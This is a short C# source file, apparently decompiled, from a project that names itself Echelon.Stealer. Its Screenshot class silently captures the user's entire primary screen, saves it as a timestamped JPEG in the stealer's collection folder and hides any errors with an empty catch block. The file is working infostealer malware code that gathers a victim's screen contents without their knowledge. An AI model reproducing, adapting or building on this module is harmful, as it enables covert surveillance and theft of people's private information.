using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Echelon.Global;

namespace Echelon.Stealer.SystemsData
{
	// Token: 0x02000026 RID: 38
	internal class Screenshot
	{
		// Token: 0x06000085 RID: 133 RVA: 0x0001B1D4 File Offset: 0x000193D4
		public static void GetScreenShot(string Echelon_Dir)
		{
			try
			{
				int width = Screen.PrimaryScreen.Bounds.Width;
				int height = Screen.PrimaryScreen.Bounds.Height;
				Bitmap bitmap = new Bitmap(width, height);
				Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
				bitmap.Save(Echelon_Dir + "\\ScreenShot_" + Echelon.Global.Help.dateLog + ".Jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}
	}
}
